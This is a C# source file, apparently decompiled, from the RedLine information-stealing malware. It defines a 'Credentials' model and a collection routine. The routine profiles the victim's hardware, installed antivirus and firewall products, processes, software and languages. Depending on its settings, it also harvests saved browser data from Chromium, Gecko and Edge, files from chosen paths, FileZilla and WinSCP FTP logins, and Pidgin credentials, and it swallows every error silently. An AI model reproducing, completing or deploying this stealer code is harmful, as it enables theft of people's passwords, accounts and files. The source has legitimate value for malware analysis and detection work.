using RedLine.Logic.Browsers;
using RedLine.Logic.Browsers.Chromium;
using RedLine.Logic.Browsers.Gecko;
using RedLine.Logic.FtpClients;
using RedLine.Logic.Helpers;
using RedLine.Logic.ImClient;
using RedLine.Logic.Others;
using RedLine.Models.Browsers;
using RedLine.Models.WMI;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management;
using System.Runtime.Serialization;

namespace RedLine.Models
{
	[DataContract(Name = "Credentials", Namespace = "v1/Models")]
	public class Credentials
	{
		[DataMember(Name = "Defenders")]
		public IList<string> Defenders
		{
			get;
			set;
		}

		[DataMember(Name = "Languages")]
		public IList<string> Languages
		{
			get;
			set;
		}

		[DataMember(Name = "InstalledSoftwares")]
		public IList<string> InstalledSoftwares
		{
			get;
			set;
		}

		[DataMember(Name = "Processes")]
		public IList<string> Processes
		{
			get;
			set;
		}

		[DataMember(Name = "Hardwares")]
		public IList<Hardware> Hardwares
		{
			get;
			set;
		}

		[DataMember(Name = "Browsers")]
		public IList<Browser> Browsers
		{
			get;
			set;
		}

		[DataMember(Name = "FtpConnections")]
		public IList<LoginPair> FtpConnections
		{
			get;
			set;
		}

		[DataMember(Name = "InstalledBrowsers")]
		public IList<InstalledBrowserInfo> InstalledBrowsers
		{
			get;
			set;
		}

		[DataMember(Name = "Files")]
		public IList<RemoteFile> Files
		{
			get;
			set;
		}

		public static Credentials Create(ClientSettings settings)
		{
			Credentials credentials = new Credentials
			{
				Browsers = new List<Browser>(),
				Files = new List<RemoteFile>(),
				FtpConnections = new List<LoginPair>(),
				Hardwares = new List<Hardware>(),
				InstalledBrowsers = new List<InstalledBrowserInfo>(),
				InstalledSoftwares = new List<string>(),
				Languages = new List<string>(),
				Processes = new List<string>(),
				Defenders = new List<string>()
			};
			try
			{
				WmiService wmiService = new WmiService();
				try
				{
					ReadOnlyCollection<WmiProcessor> source = wmiService.QueryAll<WmiProcessor>(new WmiProcessorQuery());
					credentials.Hardwares = source.Select((WmiProcessor x) => new Hardware
					{
						Caption = x.Name,
						HardType = HardwareType.Processor,
						Parameter = $"{x.NumberOfCores}"
					}).ToList();
				}
				catch
				{
				}
				try
				{
					if (credentials.Hardwares == null)
					{
						credentials.Hardwares = new List<Hardware>();
					}
					foreach (Hardware item in (from x in wmiService.QueryAll<WmiGraphicCard>(new WmiGraphicCardQuery())
						where x.AdapterRAM != 0
						select new Hardware
						{
							Caption = x.Name,
							HardType = HardwareType.Graphic,
							Parameter = $"{x.AdapterRAM}"
						}).ToList())
					{
						credentials.Hardwares.Add(item);
					}
				}
				catch
				{
				}
				try
				{
					List<WmiQueryBase> list = new List<WmiQueryBase>
					{
						new WmiAntivirusQuery(),
						new WmiAntiSpyWareQuery(),
						new WmiFirewallQuery()
					};
					string[] array = new string[2]
					{
						"ROOT\\SecurityCenter2",
						"ROOT\\SecurityCenter"
					};
					List<WmiAntivirus> list2 = new List<WmiAntivirus>();
					foreach (WmiQueryBase item2 in list)
					{
						string[] array2 = array;
						foreach (string scope in array2)
						{
							try
							{
								list2.AddRange(wmiService.QueryAll<WmiAntivirus>(item2, new ManagementObjectSearcher(scope, string.Empty)).ToList());
							}
							catch
							{
							}
						}
					}
					credentials.Defenders = list2.Select((WmiAntivirus x) => x.DisplayName).Distinct().ToList();
				}
				catch
				{
				}
				credentials.InstalledBrowsers = UserInfoHelper.GetBrowsers();
				credentials.Processes = UserInfoHelper.ListOfProcesses();
				credentials.InstalledSoftwares = UserInfoHelper.ListOfPrograms();
				credentials.Languages = UserInfoHelper.AvailableLanguages();
				if (settings.GrabBrowsers)
				{
					List<Browser> list3 = new List<Browser>();
					list3.AddRange(ChromiumEngine.ParseBrowsers());
					list3.AddRange(GeckoEngine.ParseBrowsers());
					list3.Add(EdgeEngine.ParseBrowsers());
					foreach (Browser item3 in list3)
					{
						if (!item3.IsEmpty())
						{
							credentials.Browsers.Add(item3);
						}
					}
				}
				if (settings.GrabFiles)
				{
					credentials.Files = RemoteFileGrabber.ParseFiles(settings.GrabPaths);
				}
				if (settings.GrabFTP)
				{
					List<LoginPair> list4 = new List<LoginPair>();
					list4.AddRange(FileZilla.ParseConnections());
					list4.AddRange(WinSCP.ParseConnections());
					credentials.FtpConnections = list4;
				}
				if (settings.GrabImClients)
				{
					foreach (LoginPair item4 in Pidgin.ParseConnections())
					{
						credentials.FtpConnections.Add(item4);
					}
					return credentials;
				}
				return credentials;
			}
			catch
			{
				return credentials;
			}
		}
	}
}
